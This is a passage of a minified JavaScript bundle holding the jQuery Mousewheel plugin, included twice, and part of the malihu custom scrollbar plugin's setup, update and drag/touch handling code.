            return e.deltaX = u, e.deltaY = h, e.deltaFactor = s, e.offsetX = f, e.offsetY = g, e.deltaMode = 0, a.unshift(e, c, u, h), o && clearTimeout(o), o = setTimeout(i, 200), (t.event.dispatch || t.event.handle).apply(this, a)
        }
    }

    function i() {
        s = null
    }

    function n(t, e) {
        return d.settings.adjustOldDeltas && "mousewheel" === t.type && e % 120 == 0
    }

    var o, s, r = ["wheel", "mousewheel", "DOMMouseScroll", "MozMousePixelScroll"],
        a = "onwheel" in document || document.documentMode >= 9 ? ["wheel"] : ["mousewheel", "DomMouseScroll", "MozMousePixelScroll"],
        l = Array.prototype.slice;
    if (t.event.fixHooks) for (var c = r.length; c;) t.event.fixHooks[r[--c]] = t.event.mouseHooks;
    var d = t.event.special.mousewheel = {
        version: "3.1.12", setup: function () {
            if (this.addEventListener) for (var i = a.length; i;) this.addEventListener(a[--i], e, !1); else this.onmousewheel = e;
            t.data(this, "mousewheel-line-height", d.getLineHeight(this)), t.data(this, "mousewheel-page-height", d.getPageHeight(this))
        }, teardown: function () {
            if (this.removeEventListener) for (var i = a.length; i;) this.removeEventListener(a[--i], e, !1); else this.onmousewheel = null;
            t.removeData(this, "mousewheel-line-height"), t.removeData(this, "mousewheel-page-height")
        }, getLineHeight: function (e) {
            var i = t(e), n = i["offsetParent" in t.fn ? "offsetParent" : "parent"]();
            return n.length || (n = t("body")), parseInt(n.css("fontSize"), 10) || parseInt(i.css("fontSize"), 10) || 16
        }, getPageHeight: function (e) {
            return t(e).height()
        }, settings: {adjustOldDeltas: !0, normalizeOffset: !0}
    };
    t.fn.extend({
        mousewheel: function (t) {
            return t ? this.bind("mousewheel", t) : this.trigger("mousewheel")
        }, unmousewheel: function (t) {
            return this.unbind("mousewheel", t)
        }
    })
})), function (t) {
    "function" == typeof define && define.amd ? define(["jquery"], t) : "object" == typeof exports ? module.exports = t : t(jQuery)
}((function (t) {
    function e(e) {
        var r = e || window.event, a = l.call(arguments, 1), c = 0, u = 0, h = 0, p = 0, f = 0, g = 0;
        if ((e = t.event.fix(r)).type = "mousewheel", "detail" in r && (h = -1 * r.detail), "wheelDelta" in r && (h = r.wheelDelta), "wheelDeltaY" in r && (h = r.wheelDeltaY), "wheelDeltaX" in r && (u = -1 * r.wheelDeltaX), "axis" in r && r.axis === r.HORIZONTAL_AXIS && (u = -1 * h, h = 0), c = 0 === h ? u : h, "deltaY" in r && (c = h = -1 * r.deltaY), "deltaX" in r && (u = r.deltaX, 0 === h && (c = -1 * u)), 0 !== h || 0 !== u) {
            if (1 === r.deltaMode) {
                var m = t.data(this, "mousewheel-line-height");
                c *= m, h *= m, u *= m
            } else if (2 === r.deltaMode) {
                var v = t.data(this, "mousewheel-page-height");
                c *= v, h *= v, u *= v
            }
            if (p = Math.max(Math.abs(h), Math.abs(u)), (!s || s > p) && (s = p, n(r, p) && (s /= 40)), n(r, p) && (c /= 40, u /= 40, h /= 40), c = Math[c >= 1 ? "floor" : "ceil"](c / s), u = Math[u >= 1 ? "floor" : "ceil"](u / s), h = Math[h >= 1 ? "floor" : "ceil"](h / s), d.settings.normalizeOffset && this.getBoundingClientRect) {
                var y = this.getBoundingClientRect();
                f = e.clientX - y.left, g = e.clientY - y.top
            }
            return e.deltaX = u, e.deltaY = h, e.deltaFactor = s, e.offsetX = f, e.offsetY = g, e.deltaMode = 0, a.unshift(e, c, u, h), o && clearTimeout(o), o = setTimeout(i, 200), (t.event.dispatch || t.event.handle).apply(this, a)
        }
    }

    function i() {
        s = null
    }

    function n(t, e) {
        return d.settings.adjustOldDeltas && "mousewheel" === t.type && e % 120 == 0
    }

    var o, s, r = ["wheel", "mousewheel", "DOMMouseScroll", "MozMousePixelScroll"],
        a = "onwheel" in document || document.documentMode >= 9 ? ["wheel"] : ["mousewheel", "DomMouseScroll", "MozMousePixelScroll"],
        l = Array.prototype.slice;
    if (t.event.fixHooks) for (var c = r.length; c;) t.event.fixHooks[r[--c]] = t.event.mouseHooks;
    var d = t.event.special.mousewheel = {
        version: "3.1.12", setup: function () {
            if (this.addEventListener) for (var i = a.length; i;) this.addEventListener(a[--i], e, !1); else this.onmousewheel = e;
            t.data(this, "mousewheel-line-height", d.getLineHeight(this)), t.data(this, "mousewheel-page-height", d.getPageHeight(this))
        }, teardown: function () {
            if (this.removeEventListener) for (var i = a.length; i;) this.removeEventListener(a[--i], e, !1); else this.onmousewheel = null;
            t.removeData(this, "mousewheel-line-height"), t.removeData(this, "mousewheel-page-height")
        }, getLineHeight: function (e) {
            var i = t(e), n = i["offsetParent" in t.fn ? "offsetParent" : "parent"]();
            return n.length || (n = t("body")), parseInt(n.css("fontSize"), 10) || parseInt(i.css("fontSize"), 10) || 16
        }, getPageHeight: function (e) {
            return t(e).height()
        }, settings: {adjustOldDeltas: !0, normalizeOffset: !0}
    };
    t.fn.extend({
        mousewheel: function (t) {
            return t ? this.bind("mousewheel", t) : this.trigger("mousewheel")
        }, unmousewheel: function (t) {
            return this.unbind("mousewheel", t)
        }
    })
})), function (t) {
    "undefined" != typeof module && module.exports ? module.exports = t : t(jQuery, window, document)
}((function (t) {
    var e, i, n;
    e = "function" == typeof define && define.amd, i = "undefined" != typeof module && module.exports, n = "https:" == document.location.protocol ? "https:" : "http:", e || (i ? require("jquery-mousewheel")(t) : t.event.special.mousewheel || t("head").append(decodeURI("%3Cscript src=" + n + "//cdnjs.cloudflare.com/ajax/libs/jquery-mousewheel/3.1.13/jquery.mousewheel.min.js%3E%3C/script%3E"))), function () {
        var e, i = "mCustomScrollbar", n = "mCS", o = ".mCustomScrollbar", s = {
                setTop: 0,
                setLeft: 0,
                axis: "y",
                scrollbarPosition: "inside",
                scrollInertia: 950,
                autoDraggerLength: !0,
                alwaysShowScrollbar: 0,
                snapOffset: 0,
                mouseWheel: {
                    enable: !0,
                    scrollAmount: "auto",
                    axis: "y",
                    deltaFactor: "auto",
                    disableOver: ["select", "option", "keygen", "datalist", "textarea"]
                },
                scrollButtons: {scrollType: "stepless", scrollAmount: "auto"},
                keyboard: {enable: !0, scrollType: "stepless", scrollAmount: "auto"},
                contentTouchScroll: 25,
                documentTouchScroll: !0,
                advanced: {
                    autoScrollOnFocus: "input,textarea,select,button,datalist,keygen,a[tabindex],area,object,[contenteditable='true']",
                    updateOnContentResize: !0,
                    updateOnImageLoad: "auto",
                    autoUpdateTimeout: 60
                },
                theme: "light",
                callbacks: {onTotalScrollOffset: 0, onTotalScrollBackOffset: 0, alwaysTriggerOffsets: !0}
            }, r = 0, a = {}, l = window.attachEvent && !window.addEventListener ? 1 : 0, c = !1,
            d = ["mCSB_dragger_onDrag", "mCSB_scrollTools_onDrag", "mCS_img_loaded", "mCS_disabled", "mCS_destroyed", "mCS_no_scrollbar", "mCS-autoHide", "mCS-dir-rtl", "mCS_no_scrollbar_y", "mCS_no_scrollbar_x", "mCS_y_hidden", "mCS_x_hidden", "mCSB_draggerContainer", "mCSB_buttonUp", "mCSB_buttonDown", "mCSB_buttonLeft", "mCSB_buttonRight"],
            u = {
                init: function (e) {
                    e = t.extend(!0, {}, s, e);
                    var i = h.call(this);
                    if (e.live) {
                        var l = e.liveSelector || this.selector || o, c = t(l);
                        if ("off" === e.live) return void f(l);
                        a[l] = setTimeout((function () {
                            c.mCustomScrollbar(e), "once" === e.live && c.length && f(l)
                        }), 500)
                    } else f(l);
                    return e.setWidth = e.set_width ? e.set_width : e.setWidth, e.setHeight = e.set_height ? e.set_height : e.setHeight, e.axis = e.horizontalScroll ? "x" : g(e.axis), e.scrollInertia = e.scrollInertia > 0 && e.scrollInertia < 17 ? 17 : e.scrollInertia, "object" != typeof e.mouseWheel && 1 == e.mouseWheel && (e.mouseWheel = {
                        enable: !0,
                        scrollAmount: "auto",
                        axis: "y",
                        preventDefault: !1,
                        deltaFactor: "auto",
                        normalizeDelta: !1,
                        invert: !1
                    }), e.mouseWheel.scrollAmount = e.mouseWheelPixels ? e.mouseWheelPixels : e.mouseWheel.scrollAmount, e.mouseWheel.normalizeDelta = e.advanced.normalizeMouseWheelDelta ? e.advanced.normalizeMouseWheelDelta : e.mouseWheel.normalizeDelta, e.scrollButtons.scrollType = m(e.scrollButtons.scrollType), p(e), t(i).each((function () {
                        var i = t(this);
                        if (!i.data(n)) {
                            i.data(n, {
                                idx: ++r,
                                opt: e,
                                scrollRatio: {y: null, x: null},
                                overflowed: null,
                                contentReset: {y: null, x: null},
                                bindEvents: !1,
                                tweenRunning: !1,
                                sequential: {},
                                langDir: i.css("direction"),
                                cbOffsets: null,
                                trigger: null,
                                poll: {size: {o: 0, n: 0}, img: {o: 0, n: 0}, change: {o: 0, n: 0}}
                            });
                            var o = i.data(n), s = o.opt, a = i.data("mcs-axis"), l = i.data("mcs-scrollbar-position"),
                                c = i.data("mcs-theme");
                            a && (s.axis = a), l && (s.scrollbarPosition = l), c && (s.theme = c, p(s)), v.call(this), o && s.callbacks.onCreate && "function" == typeof s.callbacks.onCreate && s.callbacks.onCreate.call(this), t("#mCSB_" + o.idx + "_container img:not(." + d[2] + ")").addClass(d[2]), u.update.call(null, i)
                        }
                    }))
                }, update: function (e, i) {
                    var o = e || h.call(this);
                    return t(o).each((function () {
                        var e = t(this);
                        if (e.data(n)) {
                            var o = e.data(n), s = o.opt, r = t("#mCSB_" + o.idx + "_container"),
                                a = t("#mCSB_" + o.idx),
                                l = [t("#mCSB_" + o.idx + "_dragger_vertical"), t("#mCSB_" + o.idx + "_dragger_horizontal")];
                            if (!r.length) return;
                            o.tweenRunning && Y(e), i && o && s.callbacks.onBeforeUpdate && "function" == typeof s.callbacks.onBeforeUpdate && s.callbacks.onBeforeUpdate.call(this), e.hasClass(d[3]) && e.removeClass(d[3]), e.hasClass(d[4]) && e.removeClass(d[4]), a.css("max-height", "none"), a.height() !== e.height() && a.css("max-height", e.height()), _.call(this), "y" === s.axis || s.advanced.autoExpandHorizontalScroll || r.css("width", y(r)), o.overflowed = $.call(this), O.call(this), s.autoDraggerLength && b.call(this), x.call(this), T.call(this);
                            var c = [Math.abs(r[0].offsetTop), Math.abs(r[0].offsetLeft)];
                            "x" !== s.axis && (o.overflowed[0] ? l[0].height() > l[0].parent().height() ? S.call(this) : (X(e, c[0].toString(), {
                                dir: "y",
                                dur: 0,
                                overwrite: "none"
                            }), o.contentReset.y = null) : (S.call(this), "y" === s.axis ? k.call(this) : "yx" === s.axis && o.overflowed[1] && X(e, c[1].toString(), {
                                dir: "x",
                                dur: 0,
                                overwrite: "none"
                            }))), "y" !== s.axis && (o.overflowed[1] ? l[1].width() > l[1].parent().width() ? S.call(this) : (X(e, c[1].toString(), {
                                dir: "x",
                                dur: 0,
                                overwrite: "none"
                            }), o.contentReset.x = null) : (S.call(this), "x" === s.axis ? k.call(this) : "yx" === s.axis && o.overflowed[0] && X(e, c[0].toString(), {
                                dir: "y",
                                dur: 0,
                                overwrite: "none"
                            }))), i && o && (2 === i && s.callbacks.onImageLoad && "function" == typeof s.callbacks.onImageLoad ? s.callbacks.onImageLoad.call(this) : 3 === i && s.callbacks.onSelectorChange && "function" == typeof s.callbacks.onSelectorChange ? s.callbacks.onSelectorChange.call(this) : s.callbacks.onUpdate && "function" == typeof s.callbacks.onUpdate && s.callbacks.onUpdate.call(this)), N.call(this)
                        }
                    }))
                }, scrollTo: function (e, i) {
                    if (void 0 !== e && null != e) {
                        var o = h.call(this);
                        return t(o).each((function () {
                            var o = t(this);
                            if (o.data(n)) {
                                var s = o.data(n), r = s.opt, a = {
                                        trigger: "external",
                                        scrollInertia: r.scrollInertia,
                                        scrollEasing: "mcsEaseInOut",
                                        moveDragger: !1,
                                        timeout: 60,
                                        callbacks: !0,
                                        onStart: !0,
                                        onUpdate: !0,
                                        onComplete: !0
                                    }, l = t.extend(!0, {}, a, i), c = W.call(this, e),
                                    d = l.scrollInertia > 0 && l.scrollInertia < 17 ? 17 : l.scrollInertia;
                                c[0] = F.call(this, c[0], "y"), c[1] = F.call(this, c[1], "x"), l.moveDragger && (c[0] *= s.scrollRatio.y, c[1] *= s.scrollRatio.x), l.dur = it() ? 0 : d, setTimeout((function () {
                                    null !== c[0] && void 0 !== c[0] && "x" !== r.axis && s.overflowed[0] && (l.dir = "y", l.overwrite = "all", X(o, c[0].toString(), l)), null !== c[1] && void 0 !== c[1] && "y" !== r.axis && s.overflowed[1] && (l.dir = "x", l.overwrite = "none", X(o, c[1].toString(), l))
                                }), l.timeout)
                            }
                        }))
                    }
                }, stop: function () {
                    var e = h.call(this);
                    return t(e).each((function () {
                        var e = t(this);
                        e.data(n) && Y(e)
                    }))
                }, disable: function (e) {
                    var i = h.call(this);
                    return t(i).each((function () {
                        var i = t(this);
                        i.data(n) && (i.data(n), N.call(this, "remove"), k.call(this), e && S.call(this), O.call(this, !0), i.addClass(d[3]))
                    }))
                }, destroy: function () {
                    var e = h.call(this);
                    return t(e).each((function () {
                        var o = t(this);
                        if (o.data(n)) {
                            var s = o.data(n), r = s.opt, a = t("#mCSB_" + s.idx),
                                l = t("#mCSB_" + s.idx + "_container"), c = t(".mCSB_" + s.idx + "_scrollbar");
                            r.live && f(r.liveSelector || t(e).selector), N.call(this, "remove"), k.call(this), S.call(this), o.removeData(n), K(this, "mcs"), c.remove(), l.find("img." + d[2]).removeClass(d[2]), a.replaceWith(l.contents()), o.removeClass(i + " _" + n + "_" + s.idx + " " + d[6] + " " + d[7] + " " + d[5] + " " + d[3]).addClass(d[4])
                        }
                    }))
                }
            }, h = function () {
                return "object" != typeof t(this) || t(this).length < 1 ? o : this
            }, p = function (e) {
                var i = ["rounded", "rounded-dark", "rounded-dots", "rounded-dots-dark"],
                    n = ["rounded-dots", "rounded-dots-dark", "3d", "3d-dark", "3d-thick", "3d-thick-dark", "inset", "inset-dark", "inset-2", "inset-2-dark", "inset-3", "inset-3-dark"],
                    o = ["minimal", "minimal-dark"], s = ["minimal", "minimal-dark"], r = ["minimal", "minimal-dark"];
                e.autoDraggerLength = !(t.inArray(e.theme, i) > -1) && e.autoDraggerLength, e.autoExpandScrollbar = !(t.inArray(e.theme, n) > -1) && e.autoExpandScrollbar, e.scrollButtons.enable = !(t.inArray(e.theme, o) > -1) && e.scrollButtons.enable, e.autoHideScrollbar = t.inArray(e.theme, s) > -1 || e.autoHideScrollbar, e.scrollbarPosition = t.inArray(e.theme, r) > -1 ? "outside" : e.scrollbarPosition
            }, f = function (t) {
                a[t] && (clearTimeout(a[t]), K(a, t))
            }, g = function (t) {
                return "yx" === t || "xy" === t || "auto" === t ? "yx" : "x" === t || "horizontal" === t ? "x" : "y"
            }, m = function (t) {
                return "stepped" === t || "pixels" === t || "step" === t || "click" === t ? "stepped" : "stepless"
            }, v = function () {
                var e = t(this), o = e.data(n), s = o.opt, r = s.autoExpandScrollbar ? " " + d[1] + "_expand" : "",
                    a = ["<div id='mCSB_" + o.idx + "_scrollbar_vertical' class='mCSB_scrollTools mCSB_" + o.idx + "_scrollbar mCS-" + s.theme + " mCSB_scrollTools_vertical" + r + "'><div class='" + d[12] + "'><div id='mCSB_" + o.idx + "_dragger_vertical' class='mCSB_dragger' style='position:absolute;' oncontextmenu='return false;'><div class='mCSB_dragger_bar' /></div><div class='mCSB_draggerRail' /></div></div>", "<div id='mCSB_" + o.idx + "_scrollbar_horizontal' class='mCSB_scrollTools mCSB_" + o.idx + "_scrollbar mCS-" + s.theme + " mCSB_scrollTools_horizontal" + r + "'><div class='" + d[12] + "'><div id='mCSB_" + o.idx + "_dragger_horizontal' class='mCSB_dragger' style='position:absolute;' oncontextmenu='return false;'><div class='mCSB_dragger_bar' /></div><div class='mCSB_draggerRail' /></div></div>"],
                    l = "yx" === s.axis ? "mCSB_vertical_horizontal" : "x" === s.axis ? "mCSB_horizontal" : "mCSB_vertical",
                    c = "yx" === s.axis ? a[0] + a[1] : "x" === s.axis ? a[1] : a[0],
                    u = "yx" === s.axis ? "<div id='mCSB_" + o.idx + "_container_wrapper' class='mCSB_container_wrapper' />" : "",
                    h = s.autoHideScrollbar ? " " + d[6] : "", p = "x" !== s.axis && "rtl" === o.langDir ? " " + d[7] : "";
                s.setWidth && e.css("width", s.setWidth), s.setHeight && e.css("height", s.setHeight), s.setLeft = "y" !== s.axis && "rtl" === o.langDir ? "989999px" : s.setLeft, e.addClass(i + " _" + n + "_" + o.idx + h + p).wrapInner("<div id='mCSB_" + o.idx + "' class='mCustomScrollBox mCS-" + s.theme + " " + l + "'><div id='mCSB_" + o.idx + "_container' class='mCSB_container' style='position:relative; top:" + s.setTop + "; left:" + s.setLeft + ";' dir=" + o.langDir + " /></div>");
                var f = t("#mCSB_" + o.idx), g = t("#mCSB_" + o.idx + "_container");
                "y" === s.axis || s.advanced.autoExpandHorizontalScroll || g.css("width", y(g)), "outside" === s.scrollbarPosition ? ("static" === e.css("position") && e.css("position", "relative"), e.css("overflow", "visible"), f.addClass("mCSB_outside").after(c)) : (f.addClass("mCSB_inside").append(c), g.wrap(u)), w.call(this);
                var m = [t("#mCSB_" + o.idx + "_dragger_vertical"), t("#mCSB_" + o.idx + "_dragger_horizontal")];
                m[0].css("min-height", m[0].height()), m[1].css("min-width", m[1].width())
            }, y = function (e) {
                var i = [e[0].scrollWidth, Math.max.apply(Math, e.children().map((function () {
                    return t(this).outerWidth(!0)
                })).get())], n = e.parent().width();
                return i[0] > n ? i[0] : i[1] > n ? i[1] : "100%"
            }, _ = function () {
                var e = t(this).data(n), i = e.opt, o = t("#mCSB_" + e.idx + "_container");
                if (i.advanced.autoExpandHorizontalScroll && "y" !== i.axis) {
                    o.css({width: "auto", "min-width": 0, "overflow-x": "scroll"});
                    var s = Math.ceil(o[0].scrollWidth);
                    3 === i.advanced.autoExpandHorizontalScroll || 2 !== i.advanced.autoExpandHorizontalScroll && s > o.parent().width() ? o.css({
                        width: s,
                        "min-width": "100%",
                        "overflow-x": "inherit"
                    }) : o.css({
                        "overflow-x": "inherit",
                        position: "absolute"
                    }).wrap("<div class='mCSB_h_wrapper' style='position:relative; left:0; width:999999px;' />").css({
                        width: Math.ceil(o[0].getBoundingClientRect().right + .4) - Math.floor(o[0].getBoundingClientRect().left),
                        "min-width": "100%",
                        position: "relative"
                    }).unwrap()
                }
            }, w = function () {
                var e = t(this).data(n), i = e.opt, o = t(".mCSB_" + e.idx + "_scrollbar:first"),
                    s = tt(i.scrollButtons.tabindex) ? "tabindex='" + i.scrollButtons.tabindex + "'" : "",
                    r = ["<a href='#' class='" + d[13] + "' oncontextmenu='return false;' " + s + " />", "<a href='#' class='" + d[14] + "' oncontextmenu='return false;' " + s + " />", "<a href='#' class='" + d[15] + "' oncontextmenu='return false;' " + s + " />", "<a href='#' class='" + d[16] + "' oncontextmenu='return false;' " + s + " />"],
                    a = ["x" === i.axis ? r[2] : r[0], "x" === i.axis ? r[3] : r[1], r[2], r[3]];
                i.scrollButtons.enable && o.prepend(a[0]).append(a[1]).next(".mCSB_scrollTools").prepend(a[2]).append(a[3])
            }, b = function () {
                var e = t(this).data(n), i = t("#mCSB_" + e.idx), o = t("#mCSB_" + e.idx + "_container"),
                    s = [t("#mCSB_" + e.idx + "_dragger_vertical"), t("#mCSB_" + e.idx + "_dragger_horizontal")],
                    r = [i.height() / o.outerHeight(!1), i.width() / o.outerWidth(!1)],
                    a = [parseInt(s[0].css("min-height")), Math.round(r[0] * s[0].parent().height()), parseInt(s[1].css("min-width")), Math.round(r[1] * s[1].parent().width())],
                    c = l && a[1] < a[0] ? a[0] : a[1], d = l && a[3] < a[2] ? a[2] : a[3];
                s[0].css({
                    height: c,
                    "max-height": s[0].parent().height() - 10
                }).find(".mCSB_dragger_bar").css({"line-height": a[0] + "px"}), s[1].css({
                    width: d,
                    "max-width": s[1].parent().width() - 10
                })
            }, x = function () {
                var e = t(this).data(n), i = t("#mCSB_" + e.idx), o = t("#mCSB_" + e.idx + "_container"),
                    s = [t("#mCSB_" + e.idx + "_dragger_vertical"), t("#mCSB_" + e.idx + "_dragger_horizontal")],
                    r = [o.outerHeight(!1) - i.height(), o.outerWidth(!1) - i.width()],
                    a = [r[0] / (s[0].parent().height() - s[0].height()), r[1] / (s[1].parent().width() - s[1].width())];
                e.scrollRatio = {y: a[0], x: a[1]}
            }, C = function (t, e, i) {
                var n = i ? d[0] + "_expanded" : "", o = t.closest(".mCSB_scrollTools");
                "active" === e ? (t.toggleClass(d[0] + " " + n), o.toggleClass(d[1]), t[0]._draggable = t[0]._draggable ? 0 : 1) : t[0]._draggable || ("hide" === e ? (t.removeClass(d[0]), o.removeClass(d[1])) : (t.addClass(d[0]), o.addClass(d[1])))
            }, $ = function () {
                var e = t(this).data(n), i = t("#mCSB_" + e.idx), o = t("#mCSB_" + e.idx + "_container"),
                    s = null == e.overflowed ? o.height() : o.outerHeight(!1),
                    r = null == e.overflowed ? o.width() : o.outerWidth(!1), a = o[0].scrollHeight, l = o[0].scrollWidth;
                return a > s && (s = a), l > r && (r = l), [s > i.height(), r > i.width()]
            }, S = function () {
                var e = t(this), i = e.data(n), o = i.opt, s = t("#mCSB_" + i.idx), r = t("#mCSB_" + i.idx + "_container"),
                    a = [t("#mCSB_" + i.idx + "_dragger_vertical"), t("#mCSB_" + i.idx + "_dragger_horizontal")];
                if (Y(e), ("x" !== o.axis && !i.overflowed[0] || "y" === o.axis && i.overflowed[0]) && (a[0].add(r).css("top", 0), X(e, "_resetY")), "y" !== o.axis && !i.overflowed[1] || "x" === o.axis && i.overflowed[1]) {
                    var l = dx = 0;
                    "rtl" === i.langDir && (l = s.width() - r.outerWidth(!1), dx = Math.abs(l / i.scrollRatio.x)), r.css("left", l), a[1].css("left", dx), X(e, "_resetX")
                }
            }, T = function () {
                function e() {
                    i = setTimeout((function () {
                        t.event.special.mousewheel ? (clearTimeout(i), D.call(o[0])) : e()
                    }), 100)
                }

                var i, o = t(this), s = o.data(n), r = s.opt;
                s.bindEvents || (E.call(this), r.contentTouchScroll && z.call(this), I.call(this), r.mouseWheel.enable && e(), M.call(this), B.call(this), r.advanced.autoScrollOnFocus && q.call(this), r.scrollButtons.enable && j.call(this), r.keyboard.enable && R.call(this), s.bindEvents = !0)
            }, k = function () {
                var e = t(this), i = e.data(n), o = i.opt, s = n + "_" + i.idx, r = ".mCSB_" + i.idx + "_scrollbar",
                    a = t("#mCSB_" + i.idx + ",#mCSB_" + i.idx + "_container,#mCSB_" + i.idx + "_container_wrapper," + r + " ." + d[12] + ",#mCSB_" + i.idx + "_dragger_vertical,#mCSB_" + i.idx + "_dragger_horizontal," + r + ">a"),
                    l = t("#mCSB_" + i.idx + "_container");
                o.advanced.releaseDraggableSelectors && a.add(t(o.advanced.releaseDraggableSelectors)), o.advanced.extraDraggableSelectors && a.add(t(o.advanced.extraDraggableSelectors)), i.bindEvents && (t(document).add(t(!P() || top.document)).unbind("." + s), a.each((function () {
                    t(this).unbind("." + s)
                })), clearTimeout(e[0]._focusTimeout), K(e[0], "_focusTimeout"), clearTimeout(i.sequential.step), K(i.sequential, "step"), clearTimeout(l[0].onCompleteTimeout), K(l[0], "onCompleteTimeout"), i.bindEvents = !1)
            }, O = function (e) {
                var i = t(this), o = i.data(n), s = o.opt, r = t("#mCSB_" + o.idx + "_container_wrapper"),
                    a = r.length ? r : t("#mCSB_" + o.idx + "_container"),
                    l = [t("#mCSB_" + o.idx + "_scrollbar_vertical"), t("#mCSB_" + o.idx + "_scrollbar_horizontal")],
                    c = [l[0].find(".mCSB_dragger"), l[1].find(".mCSB_dragger")];
                "x" !== s.axis && (o.overflowed[0] && !e ? (l[0].add(c[0]).add(l[0].children("a")).css("display", "block"), a.removeClass(d[8] + " " + d[10])) : (s.alwaysShowScrollbar ? (2 !== s.alwaysShowScrollbar && c[0].css("display", "none"), a.removeClass(d[10])) : (l[0].css("display", "none"), a.addClass(d[10])), a.addClass(d[8]))), "y" !== s.axis && (o.overflowed[1] && !e ? (l[1].add(c[1]).add(l[1].children("a")).css("display", "block"), a.removeClass(d[9] + " " + d[11])) : (s.alwaysShowScrollbar ? (2 !== s.alwaysShowScrollbar && c[1].css("display", "none"), a.removeClass(d[11])) : (l[1].css("display", "none"), a.addClass(d[11])), a.addClass(d[9]))), o.overflowed[0] || o.overflowed[1] ? i.removeClass(d[5]) : i.addClass(d[5])
            }, A = function (e) {
                var i = e.type,
                    n = e.target.ownerDocument !== document ? [t(frameElement).offset().top, t(frameElement).offset().left] : null,
                    o = P() && e.target.ownerDocument !== top.document ? [t(e.view.frameElement).offset().top, t(e.view.frameElement).offset().left] : [0, 0];
                switch (i) {
                    case"pointerdown":
                    case"MSPointerDown":
                    case"pointermove":
                    case"MSPointerMove":
                    case"pointerup":
                    case"MSPointerUp":
                        return n ? [e.originalEvent.pageY - n[0] + o[0], e.originalEvent.pageX - n[1] + o[1], !1] : [e.originalEvent.pageY, e.originalEvent.pageX, !1];
                    case"touchstart":
                    case"touchmove":
                    case"touchend":
                        var s = e.originalEvent.touches[0] || e.originalEvent.changedTouches[0],
                            r = e.originalEvent.touches.length || e.originalEvent.changedTouches.length;
                        return e.target.ownerDocument !== document ? [s.screenY, s.screenX, r > 1] : [s.pageY, s.pageX, r > 1];
                    default:
                        return n ? [e.pageY - n[0] + o[0], e.pageX - n[1] + o[1], !1] : [e.pageY, e.pageX, !1]
                }
            }, E = function () {
                function e(t) {
                    var e = f.find("iframe");
                    if (e.length) {
                        var i = t ? "auto" : "none";
                        e.css("pointer-events", i)
                    }
                }

                function i(t, e, i, n) {
                    if (f[0].idleTimer = u.scrollInertia < 233 ? 250 : 0, o.attr("id") === p[1]) var s = "x",
                        r = (o[0].offsetLeft - e + n) * d.scrollRatio.x; else s = "y", r = (o[0].offsetTop - t + i) * d.scrollRatio.y;
                    X(a, r.toString(), {dir: s, drag: !0})
                }

                var o, s, r, a = t(this), d = a.data(n), u = d.opt, h = n + "_" + d.idx,
                    p = ["mCSB_" + d.idx + "_dragger_vertical", "mCSB_" + d.idx + "_dragger_horizontal"],
                    f = t("#mCSB_" + d.idx + "_container"), g = t("#" + p[0] + ",#" + p[1]),
                    m = u.advanced.releaseDraggableSelectors ? g.add(t(u.advanced.releaseDraggableSelectors)) : g,
                    v = u.advanced.extraDraggableSelectors ? t(!P() || top.document).add(t(u.advanced.extraDraggableSelectors)) : t(!P() || top.document);
                g.bind("mousedown." + h + " touchstart." + h + " pointerdown." + h + " MSPointerDown." + h, (function (i) {
                    if (i.stopImmediatePropagation(), i.preventDefault(), Z(i)) {
                        c = !0, l && (document.onselectstart = function () {
                            return !1
                        }), e(!1), Y(a);
                        var n = (o = t(this)).offset(), d = A(i)[0] - n.top, h = A(i)[1] - n.left, p = o.height() + n.top,
                            f = o.width() + n.left;
                        p > d && d > 0 && f > h && h > 0 && (s = d, r = h), C(o, "active", u.autoExpandScrollbar)
                    }
                })).bind("touchmove." + h, (function (t) {
                    t.stopImmediatePropagation(), t.preventDefault();
                    var e = o.offset(), n = A(t)[0] - e.top, a = A(t)[1] - e.left;
                    i(s, r, n, a)
                })), t(document).add(v).bind("mousemove." + h + " pointermove." + h + " MSPointerMove." + h, (function (t) {
                    if (o) {
                        var e = o.offset(), n = A(t)[0] - e.top, a = A(t)[1] - e.left;
                        if (s === n && r === a) return;
                        i(s, r, n, a)
                    }
                })).add(m).bind("mouseup." + h + " touchend." + h + " pointerup." + h + " MSPointerUp." + h, (function (t) {
                    o && (C(o, "active", u.autoExpandScrollbar), o = null), c = !1, l && (document.onselectstart = null), e(!0)
                }))
            }, z = function () {
                function i(t) {
                    if (!J(t) || c || A(t)[2]) e = 0; else {
                        e = 1, x = 0, C = 0, d = 1, $.removeClass("mCS_touch_action");
                        var i = E.offset();
                        u = A(t)[0] - i.top, h = A(t)[1] - i.left, q = [A(t)[0], A(t)[1]]
                    }
                }

                function o(t) {
                    if (J(t) && !c && !A(t)[2] && (T.documentTouchScroll || t.preventDefault(), t.stopImmediatePropagation(), (!C || x) && d)) {
                        m = G();
                        var e = O.offset(), i = A(t)[0] - e.top, n = A(t)[1] - e.left, o = "mcsLinearOut";
                        if (I.push(i), D.push(n), q[2] = Math.abs(A(t)[0] - q[0]), q[3] = Math.abs(A(t)[1] - q[1]), S.overflowed[0]) var s = z[0].parent().height() - z[0].height(),
                            r = u - i > 0 && i - u > -s * S.scrollRatio.y && (2 * q[3] < q[2] || "yx" === T.axis);
                        if (S.overflowed[1]) var a = z[1].parent().width() - z[1].width(),
                            p = h - n > 0 && n - h > -a * S.scrollRatio.x && (2 * q[2] < q[3] || "yx" === T.axis);
                        r || p ? (R || t.preventDefault(), x = 1) : (C = 1, $.addClass("mCS_touch_action")), R && t.preventDefault(), w = "yx" === T.axis ? [u - i, h - n] : "x" === T.axis ? [null, h - n] : [u - i, null], E[0].idleTimer = 250, S.overflowed[0] && l(w[0], L, o, "y", "all", !0), S.overflowed[1] && l(w[1], L, o, "x", M, !0)
                    }
                }

                function s(t) {
                    if (!J(t) || c || A(t)[2]) e = 0; else {
                        e = 1, t.stopImmediatePropagation(), Y($), g = G();
                        var i = O.offset();
                        p = A(t)[0] - i.top, f = A(t)[1] - i.left, I = [], D = []
                    }
                }

                function r(t) {
                    if (J(t) && !c && !A(t)[2]) {
                        d = 0, t.stopImmediatePropagation(), x = 0, C = 0, v = G();
                        var e = O.offset(), i = A(t)[0] - e.top, n = A(t)[1] - e.left;
                        if (!(v - m > 30)) {
                            var o = "mcsEaseOut", s = 2.5 > (_ = 1e3 / (v - g)),
                                r = s ? [I[I.length - 2], D[D.length - 2]] : [0, 0];
                            y = s ? [i - r[0], n - r[1]] : [i - p, n - f];
                            var u = [Math.abs(y[0]), Math.abs(y[1])];
                            _ = s ? [Math.abs(y[0] / 4), Math.abs(y[1] / 4)] : [_, _];
